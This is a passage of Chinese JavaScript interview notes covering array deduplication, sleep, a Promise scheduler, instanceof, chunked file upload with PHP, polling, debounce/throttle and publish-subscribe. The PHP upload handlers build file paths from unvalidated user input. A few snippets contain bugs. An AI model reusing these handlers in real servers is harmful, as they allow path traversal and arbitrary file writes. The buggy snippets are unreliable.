    let m=new Map();
    const result=new Array();

    for(let i=0;i< arr.length;i++){
        if (m.has(arr[i])) {
            //map.set(arr[i], true);
            m.set(arr[i],m.get(arr[i])+1);  //可以查看重复元素及其次数
        }else{
            //map.set(arr[i], false);   // 如果没有该key值
            m.set(arr[i],1);
            result.push(arr[i]);
        }
    }
    // console.log(m);  //Map(5) { 1 => 1, 2 => 3, 3 => 2, 4 => 1, 5 => 1 }
    return result;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(removeRepeatElementOfArray(arr))
// [1, 'true', true,  15, false, undefined, null,  NaN, 'NaN', 0, 'a', {}, {} ]]      //{}没有去重
```



### (6)  Set+ Array.from()

利用 ES6 中的 Set 集合，Set 集合是一种无重复元素的列表，new Set(arr)会自动剔除重复元素，Array.from(...)将 Set 集合转换为数组

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
	return Array.from(new Set(arr));
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]
```

```js
function unique (arr) {
  return Array.from(new Set(arr))
}
var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
 //[1, "true", true, 15, false, undefined, null, NaN, "NaN", 0, "a", {}, {}]
```

不考虑兼容性，**这种去重的方法代码最少**。这种方法还无法去掉“{}”空对象，后面的高阶方法会添加去掉重复“{}”的方法。

### (7) Set + …(展开运算符)

思路与方法6一致，只是将 Set 集合转换为数组的实现方法从 Array.from(...) 改成了 ...(展开运算符)

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
	return [...new Set(arr)];
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]
```



### (8) for循环(一次) + 新对象

将创建一个新数组，**改成创建一个新对象**，判定对象的 key 值，存在跳过，不存在则将字符以对象的 key 值存储

执行时间：所有的方法中最短的，**因为js对象的属性是基于Hash表实现**，对属性进行访问的时间复杂度可以达到O(1)，故此方法的时间复杂度为O(n) ；上述一般双重循环时间复杂度为O(n^2)

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
	let obj={};
	for (let i=0; i < arr.length; i++){
		if (!obj[arr[i]]) {
			obj[arr[i]]=1;
		}
	}
	return Object.keys(obj);
}

console.log(removeRepeatElementOfArray(nums));  // [ '1', '2', '3', '4', '5' ]
```



### (9)  includes + 新数组

```js
function unique(arr) {
    if (!Array.isArray(arr)) {
        console.log('type error!')
        return
    }
    var array =[];
    for(var i = 0; i < arr.length; i++) {
            if( !array.includes( arr[i]) ) {//includes 检测数组是否有某个值
                    array.push(arr[i]);
              }
    }
    return array
}
var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
    //[1, "true", true, 15, false, undefined, null, NaN, "NaN", 0, "a", {…}, {…}]     //{}没有去重

```

### (10) 利用hasOwnProperty + 空对象

```js
function unique(arr) {
    var obj = {};
    return arr.filter(function(item, index, arr){
        return obj.hasOwnProperty(typeof item + item) ? false : (obj[typeof item + item] = true)
    })
}

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
//[1, "true", true, 15, false, undefined, null, NaN, "NaN", 0, "a", {…}]   // 所有的都去重了

```

利用hasOwnProperty 判断是否存在对象属性



### (11)  利用filter + indexOf

```js
function unique(arr) {
  return arr.filter(function(item, index, arr) {
    //当前元素，在原始数组中的第一个索引==当前索引值，否则返回当前元素
    return arr.indexOf(item, 0) === index;
  });
}
    var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
        console.log(unique(arr))
//[1, "true", true, 15, false, undefined, null, "NaN", 0, "a", {}, {}]
//{}没有去重
```



### (12)  利用递归去重

```js
function unique(arr) {
        var array= arr;
        var len = array.length;

    array.sort(function(a,b){   //排序后更加方便去重
        return a - b;
    })

    function loop(index){
        if(index >= 1){
            if(array[index] === array[index-1]){
                array.splice(index,1);
            }
            loop(index - 1);    //递归loop，然后数组去重
        }
    }
    loop(len-1);
    return array;
}
 var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(unique(arr))
//[1, "a", "true", true, 15, false, 1, {…}, null, NaN, NaN, "NaN", 0, "a", {…}, undefined]
//{},NaN没有去重
```

### (13)  利用reduce+includes

```js
function unique(arr){
    return arr.reduce((prev,cur) => prev.includes(cur) ? prev : [...prev, cur], []);
}

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];

console.log(unique(arr));
// [1, "true", true, 15, false, undefined, null, NaN, "NaN", 0, "a", {…}, {…}]
//{}没有去重
```



---

## 2. 用js实现sleep，用promise

(1) 普通版

```js
function sleep(sleepTime) {
    for(var start = new Date; new Date - start <= sleepTime;) {}
}
var t1 = +new Date()
sleep(3000)
var t2 = +new Date()
console.log(t2 - t1)

```

优点：简单粗暴，通俗易懂。

缺点：这是最简单粗暴的实现，确实 sleep 了，也确实卡死了，CPU 会飙升，无论你的服务器 CPU 有多么 Niubility。

(2) Promise 版本

```js
function sleep(time) {
  return new Promise(resolve => setTimeout(resolve, time))
}

const t1 = +new Date()
sleep(3000).then(() => {
  const t2 = +new Date()
  console.log(t2 - t1)
})
```

优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。

缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭

(3) Async/Await 版本

```js
function sleep(time){
    return new Promise(resolve=>setTimeout(resolve,time));
}

async function test(){
    const t1=+new Date();
    await sleep(3000);
    const t2=+new Date();
    console.log(t2-t1);
}();
```

缺点： ES7 语法存在兼容性问题，**有 babel 一切兼容性都不是问题**

更优雅的写法

```js
function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

// 用法
sleep(500).then(() => {
    // 这里写sleep之后需要去做的事情
})
```



(4) 使用sleep包

```js
const sleep = require("sleep")
const t1 = +new Date()
sleep.msleep(3000)
const t2 = +new Date()
console.log(t2 - t1)

```

优点：能够实现更加精细的时间精确度，而且看起来就是真的 sleep 函数，清晰直白。





------

## 3. 实现一个 Scheduler 类，完成对Promise的并发处理，最多同时执行2个任务



```js
class Scheduler{
    constructor(){
        this.tasks = [];  // 待运行的任务
        this.usingTask = [];  // 正在运行的任务
    }

    //promiseCreator 是一个异步函数，return Promise
    add(promiseCreator){
        return new Promise((resolve, reject) => {
            promiseCreator.resolve = resolve;
            if (this.usingTask.length < 2) {
                this.usingRun(promiseCreator);
            }else{
                this.tasks.push(promiseCreator);
            }
        });
    }

    usingRun(promiseCreator){
        this.usingTask.push(promiseCreator);
        promiseCreator().then(() => {
            promiseCreator.resolve();
            this.usingMove(promiseCreator);
            if (this.tasks.length > 0) {
                this.usingRun(this.tasks.shift());
            }
        });
    }

    usingMove(promiseCreator){
        let index = this.usingTask.findIndex(promiseCreator);
        this.usingTask.splice(index, 1);
    }
}

const timeout = (time) => new Promise(resolve => {
    setTimeout(resolve,time);
});

const scheduler = new Scheduler();

const addTask = (time, order)=>{
    scheduler.add(() => timeout(time)).then(() => console.log(order));
}

addTask(400, 4);
addTask(200, 2);
addTask(300, 3);
```





------

## 4.  instanceOf 原理，手动实现 function isInstanceOf (child, Parent)

instanceof主要作用就是判断一个实例是否属于某种类型

```js
let person = function(){}
let no = new person()
no instanceof person//true
```

instanceOf 原理

```js
function new_instance_of(leftVaule, rightVaule) { 
    let rightProto = rightVaule.prototype; // 取右表达式的 prototype 值
    leftVaule = leftVaule.__proto__; // 取左表达式的__proto__值
    while (true) {
        if (leftVaule === null) {
            return false;    
        }
        if (leftVaule === rightProto) {
            return true;    
        } 
        leftVaule = leftVaule.__proto__ 
    }
}
```

其实 instanceof 主要的**实现原理就是只要右边变量的 prototype 在左边变量的原型链上即可**。因此，instanceof 在查找的过程中会遍历左边变量的原型链，直到找到右边变量的 prototype，如果查找失败，则会返回 false，告诉我们左边变量并非是右边变量的实例。

同时还要了解js的原型继承原理

我们知道每个 JavaScript 对象均有一个**隐式的 proto 原型属性**，而**显式的原型属性是 prototype**，只有 Object.prototype.proto 属性在未修改的情况下为 null 值

手动实现

```js
function instance_of(L, R) {//L 表示左表达式，R 表示右表达式
    var O = R.prototype;
    L = L.__proto__;
    while (true) { 
        if (L === null) 
        	return false; 
        if (O === L) // 这里重点：当 O 严格等于 L 时，返回true 
        	return true; 
        L = L.__proto__; 
    } 
}
// 开始测试
var a = []
var b = {}

function Foo(){}
var c = new Foo()
function child(){}
function father(){}
child.prototype = new father() 
var d = new child()

console.log(instance_of(a, Array)) // true
console.log(instance_of(b, Object)) // true
console.log(instance_of(b, Array)) // false
console.log(instance_of(a, Object)) // true

console.log(instance_of(c, Foo)) // true
console.log(instance_of(d, child)) // true
console.log(instance_of(d, father)) // true

```

**`instanceof`** **运算符**用于检测构造函数的 `prototype` 属性是否出现在某个实例对象的原型链上。

需要注意的是，如果表达式 `obj instanceof Foo` 返回 `true`，**则并不意味着该表达式会永远返回 `true`**，因为 `Foo.prototype` 属性的值有可能会改变，**改变之后的值很有可能不存在于 `obj` 的原型链上，这时原表达式的值就会成为 `false`**。

另外一种情况下，**原表达式的值也会改变，就是改变对象 `obj` 的原型链的情况**，虽然在目前的ES规范中，我们只能读取对象的原型而不能改变它，但借助于非标准的 `__proto__` 伪属性，是可以实现的。比如执行 `obj.__proto__ = {}` 之后，`obj instanceof Foo` 就会返回 `false` 了。



----

## 5. 文件异步上传怎么实现

(1) 普通表单上传

使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype="multipart/form-data"，表明表单需要上传二进制数据。

```html
<form action="/index.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="myfile">
  <input type="submit">
</form>
```

然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好...)

```php
$imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES["myfile"]['type']);
$fileName =  'upload/'.$imgName;
// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功
if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName)){
    echo $fileName;
}else {
    echo "nonn";
}
```

form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。



(2) 文件编码上传

第一个思路是将文件进行编码，然后在服务端进行解码，在前端实现图片压缩上传的方法，其主要实现原理就是将图片转换成base64进行传递

```js
var imgURL = URL.createObjectURL(file);
ctx.drawImage(imgURL, 0, 0);
// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递
var data = canvas.toDataURL("image/jpeg", 0.5); 
```

在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可

```php
$imgData = $_REQUEST['imgData'];
$base64 = explode(',', $imgData)[1];
$img = base64_decode($base64);
$url = './test.jpg';
if (file_put_contents($url, $img)) {
    exit(json_encode(array(
        url => $url
    )));
}
```

base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，**因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加**。

更多关于base64的知识，可以参考Base64笔记。

除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传

```js
// 读取二进制文件
function readBinary(text){
   var data = new ArrayBuffer(text.length);
   var ui8a = new Uint8Array(data, 0);
   for (var i = 0; i < text.length; i++){ 
     ui8a[i] = (text.charCodeAt(i) & 0xff);
   }
   console.log(ui8a)
}

var reader = new FileReader();
reader.onload = function(){
      readBinary(this.result) // 读取result或直接上传
}
// 把从input里读取的文件内容，放到fileReader的result字段里
reader.readAsBinaryString(file);
```

(3) formData异步上传

FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键/值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。

```js
let files = e.target.files // 获取input的file对象
let formData = new FormData();
formData.append('file', file);
axios.post(url, formData);
```

服务端处理方式与直接form表单请求基本相同。

(4) iframe无刷新页面

在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的[target](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form)属性导致的，其取值有

- _self，默认值，在相同的窗口中打开响应页面
- _blank，在新窗口打开
- _parent，在父窗口打开
- _top，在最顶层的窗口打开
- framename，在指定名字的iframe中打开

如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。

```js
function upload(){
    var now = +new Date()
    var id = 'frame' + now
    $("body").append(`<iframe style="display:none;" name="${id}" id="${id}" />`);

    var $form = $("#myForm")
    $form.attr({
        "action": '/index.php',
        "method": "post",
        "enctype": "multipart/form-data",
        "encoding": "multipart/form-data",
        "target": id
    }).submit()

    $("#"+id).on("load", function(){
        var content = $(this).contents().find("body").text()
        try{
            var data = JSON.parse(content)
        }catch(e){
            console.log(e)
        }
    })
}
```

**扩展：**

**大文件上传**

现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，

- 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形
- 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题
- 编码上传，我们可以比较灵活地控制上传的内容

大文件上传最主要的问题就在于：**在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传**。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？

综合上面的问题，看来大文件上传需要实现下面几个需求

- 支持拆分上传请求(即切片)
- 支持断点续传
- 支持显示上传进度和暂停上传

接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。

**文件切片**

编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。

在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。

下面是一个拆分文件的示例

```js
function slice(file, piece = 1024 * 1024 * 5) {
 let totalSize = file.size; // 文件总大小
 let start = 0; // 每次上传的开始字节
 let end = start + piece; // 每次上传的结尾字节
 let chunks = []
 while (start < totalSize) {
 // 根据长度截取每次需要上传的数据
 // File对象继承自Blob对象，因此包含slice方法
 let blob = file.slice(start, end); 
 chunks.push(blob)
 start = end;
 end = start + piece;
 }
 return chunks
}
```

将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可

```js
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH); // 首先拆分切片
chunks.forEach(chunk=>{
 let fd = new FormData();
 fd.append("file", chunk);
 post('/mkblk.php', fd)
})

```

服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码

```php
$filename = './upload/' . $_POST['filename'];//确定上传的文件名
//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中
if(!file_exists($filename)){
 move_uploaded_file($_FILES['file']['tmp_name'],$filename);
}else{
 file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND);
 echo $filename;
}

```

测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。

```bash
server {
    // ...
    client_max_body_size 50m;
}
```

上面这种方式来存在一些问题

- 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错
- 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的

因此接下来我们来看看应该如何在服务端还原切片。

**还原切片**

在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题

- 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数
- 如何将多个切片还原成一个文件
- 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接
- 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值
- 按顺序拼接切片，还原成文件

上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取

- 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性
- 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.

修改上传代码，增加相关参数

```js
// 获取context，同一个文件会返回相同的值
function createContext(file) {
     return file.name + file.length
}
let file = document.querySelector("[name=file]").files[0];
const LENGTH = 1024 * 1024 * 0.1;
let chunks = slice(file, LENGTH);
// 获取对于同一个文件，获取其的context
let context = createContext(file);
let tasks = [];
chunks.forEach((chunk, index) => {
     let fd = new FormData();
     fd.append("file", chunk);
     // 传递context
     fd.append("context", context);
     // 传递切片索引值
     fd.append("chunk", index + 1);

     tasks.push(post("/mkblk.php", fd));
});
// 所有切片上传完毕后，调用mkfile接口
Promise.all(tasks).then(res => {
     let fd = new FormData();
     fd.append("context", context);
     fd.append("chunks", chunks.length);
     post("/mkfile.php", fd).then(res => {
     	console.log(res);
 	});
});

```

在mkblk.php接口中，我们通过context来保存同一个文件相关的切片

```php
// mkblk.php
$context = $_POST['context'];
$path = './upload/' . $context;
if(!is_dir($path)){
 mkdir($path);
}
// 把同一个文件的切片放在相同的目录下
$filename = $path .'/'. $_POST['chunk'];
$res = move_uploaded_file($_FILES['file']['tmp_name'],$filename);

```

除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用

```php
// mkfile.php
$context = $_POST['context'];
$chunks = (int)$_POST['chunks'];
//合并后的文件名
$filename = './upload/' . $context . '/file.jpg'; 
for($i = 1; $i <= $chunks; ++$i){
 $file = './upload/'.$context. '/' .$i; // 读取单个切块
 $content = file_get_contents($file);
 if(!file_exists($filename)){
 	$fd = fopen($filename, "w+");
 }else{
 	$fd = fopen($filename, "a");
 }
 fwrite($fd, $content); // 将切块合并到一个文件上
}
echo $filename;

```

这样就解决了上面的两个问题：

- 识别切片来源
- 保证切片拼接顺序

**断点续传**

即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过**断点续传**来进行处理。

断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。

由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：

- 在切片上传成功后，保存已上传的切片信息
- 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传
- 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并

因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略

- 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失
- 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录

下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能

```js
// 获取已上传切片记录
function getUploadSliceRecord(context){
 let record = localStorage.getItem(context)
 if(!record){
 	return []
 }else {
     try{
     	return JSON.parse(record)
     }catch(e){
         
     }
     }
}
// 保存已上传切片
function saveUploadSliceRecord(context, sliceIndex){
 let list = getUploadSliceRecord(context)
 list.push(sliceIndex)
 localStorage.setItem(context, JSON.stringify(list))
}

```

然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑

```js
let context = createContext(file);
// 获取上传记录
let record = getUploadSliceRecord(context);
let tasks = [];
chunks.forEach((chunk, index) => {
 // 已上传的切片则不再重新上传
 if(record.includes(index)){
 return
 }

 let fd = new FormData();
 fd.append("file", chunk);
 fd.append("context", context);
 fd.append("chunk", index + 1);
 let task = post("/mkblk.php", fd).then(res=>{
 // 上传成功后保存已上传切片记录
 saveUploadSliceRecord(context, index)
 record.push(index)
 })
 tasks.push(task);
});

```

此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。

服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。

此外断点续传还需要考虑**切片过期**的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。

**上传进度和暂停**

通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。

上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。





------

## 6. 使用setInterval请求实时数据，返回顺序不一致怎么解决

场景：

```js
setInterval(function() {
    $.get("/path/to/server", function(data, status) {
        console.log(data);
    });
}, 10000);
```

上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的**缺陷**：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。

解决方案：

1. 使用setTimeout代替setInterval

   程序首先设置10秒后发起请求，**当数据返回后再隔10秒发起第二次请求**，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。

   ```js
   function poll() {
       setTimeout(function() {
           $.get("/path/to/server", function(data, status) {
               console.log(data);
               // 发起下一次请求
               poll();
           });
       }, 10000);
   }
   ```

   2. WebSocket

   WebSocket 协议本质上是一个基于 TCP 的协议。

   为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息"Upgrade: WebSocket"表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，**并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。**

   服务器（Node.js）：

   ```js
   var WebSocketServer = require('ws').Server;
   var wss = new WebSocketServer({port: 8080});
   
   wss.on("connection", function(socket) {
       socket.on("message", function(msg) {
           console.log(msg);
           socket.send("Nice to meet you!");
       });
   });
   ```

   客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：

   ```js
   // WebSocket 为客户端JavaScript的原生对象
   var ws = new WebSocket("ws://localhost:8080");
   ws.onopen = function (event) {
       ws.send("Hello there!");
   }
   ws.onmessage = function (event) {
       console.log(event.data);
   }
   ```



------

## 7. 防抖和节流的原理和使用场景

函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。

**防抖：**

**在事件被触发n秒后再执行回调**，如果在这n秒内又被触发，则重新计时。

根据函数防抖思路设计出第一版的最简单的防抖代码：

```js
var timer; // 维护同一个timer
function debounce(fn, delay) {
    clearTimeout(timer);
    timer = setTimeout(function(){
        fn();
    }, delay);
}

```

上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是**函数防抖**。

在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，**我们应该用闭包来解决这些问题**。

优化后的代码：

```js
function debounce(fn, delay) {
    var timer; // 维护一个 timer
    return function () {
        var _this = this; // 取debounce执行作用域的this
        var args = arguments;
        if (timer) {
            clearTimeout(timer);
        }
        timer = setTimeout(function () {
            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);
        }, delay);
    };
}

```

使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。

**节流：**

每隔一段时间，只执行一次函数。

- 定时器实现节流函数：

  ```js
  function throttle(fn, delay) {
      var timer;
      return function () {
          var _this = this;
          var args = arguments;
          if (timer) {
              return;
          }
          timer = setTimeout(function () {
              fn.apply(_this, args);
              timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器
          }, delay)
      }
  }
  
  ```

  

- 时间戳实现节流函数：

  ```js
  function throttle(fn, delay) {
      var previous = 0;
      // 使用闭包返回一个函数并且用到闭包函数外面的变量previous
      return function() {
          var _this = this;
          var args = arguments;
          var now = new Date();
          if(now - previous > delay) {
              fn.apply(_this, args);
              previous = now;
          }
      }
  }
  
  ```

  

**异同比较**

相同点：

- 都可以通过使用 setTimeout 实现。
- 目的都是，**降低回调执行频率。节省计算资源**。

不同点：

- 函数防抖，在一段连续操作结束后，处理回调，**利用clearTimeout 和 setTimeout实现**。函数节流，在一段连续操作中，**每一段时间只执行一次**，频率较高的事件中使用来提高性能。
- 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。

常见应用场景

**函数防抖的应用场景:**

连续的事件，只需触发一次回调的场景有：

- 搜索框搜索输入。只需用户最后一次输入完，再发送请求
- 手机号、邮箱验证输入检测
- 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。

**函数节流的应用场景:**

间隔一段时间执行一次回调的场景有：

- 滚动加载，加载更多或滚到底部监听
- 谷歌搜索框，搜索联想功能
- 高频点击提交，表单重复提交



------

##  8. 手写一个发布订阅

```js
// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;
interface CacheProps {
  [key: string]: Array<((data?: unknown) => void)>;
}

class Observer {
  private caches: CacheProps = {}; // 事件中心
  on (eventName: string, fn: (data?: unknown) => void){ // eventName事件名-独一无二, fn订阅后执行的自定义行为
    this.caches[eventName] = this.caches[eventName] || [];
    this.caches[eventName].push(fn);
  }

  emit (eventName: string, data?: unknown) { // 发布 => 将订阅的事件进行统一执行
    if (this.caches[eventName]) {
      this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data));
    }
  }

  off (eventName: string, fn?: (data?: unknown) => void) { // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息
    if (this.caches[eventName]) {
      const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : [];
      this.caches[eventName] = newCaches;
    }
  }

}

```

**定义**
发布-订阅模式其实是一种对象间一对多的依赖关系，当一个对象的状态发送改变时，所有依赖于它的对象都将得到状态改变的通知。
订阅者（Subscriber）把自己想订阅的事件注册（Subscribe）到调度中心（Event Channel），当发布者（Publisher）发布该事件（Publish Event）到调度中心，也就是该事件触发时，由调度中心统一调度（Fire Event）订阅者注册到调度中心的处理代码。

**实现思路**

1. 创建一个 EventEmitter 类
2. 在该类上创建一个事件中心（Map）
3. on 方法用来把函数 fn 都加到事件中心中（订阅者注册事件到调度中心）
4. emit 方法取到 arguments 里第一个当做 event，根据 event 值去执行对应事件中心中的函数（发布者发布事件到调度中心，调度中心处理代码）
5. off 方法可以根据 event 值取消订阅（取消订阅）
6. once 方法只监听一次，调用完毕后删除缓存函数（订阅一次）
7. 注册一个 newListener 用于监听新的事件订阅

```js
class EventEmitter{
    //第一步，创建一个类，并初始化一个事件存储中心
    constructor(){
        // 用来存放注册的事件与回调
        this._events={};
    }

    //第二步，实现事件的订阅方法 on
    //将事件回调函数存储到对应的事件上
    on(eventName,callback){
        //第六步，注册一个 newListener 用于监听新的事件订阅
        //在用户注册的事件的时候，发布一下newListener事件
        // 如果绑定的事件不是newListener 就触发改回调
        if (this._events[eventName]) {
            if (this.eventName!=="newListener") {
                this.emit("newListener",eventName);
            }
        }

        //由于一个事件可能注册多个回调函数，所以使用数组来存储事件队列
        const callbacks=this._events[eventName] || [];
        callbacks.push(callback);
        this._events[eventName]=callbacks;
    }

    //第三步，实现事件的发布方法 emit
    //获取到事件对应的回调函数依次执行
    emit(eventName,...args){
        //args 用于收集发布事件时传递的参数
        const callbacks=this._events[eventName]  || [];
        callbacks.forEach(cb=>cb(...args));
    }

    //第四步，实现事件的取消订阅方法 off 
    //找到事件对应的回调函数，删除对应的回调函数
    off(eventName,callback){
        const callbacks=this._events[eventName] || [];
        /*fn.initialCallback!=callback 用于once的取消订阅 */
        const newCallbacks=callbacks.filter(fn=>fn!=callback && fn.initialCallback!=callback);

        this._events[eventName]=newCallbacks;
    }

    //第五步，实现事件的单次订阅方法 once
    //1.先注册 2.事件执行后取消订阅
    once(eventName,callback){
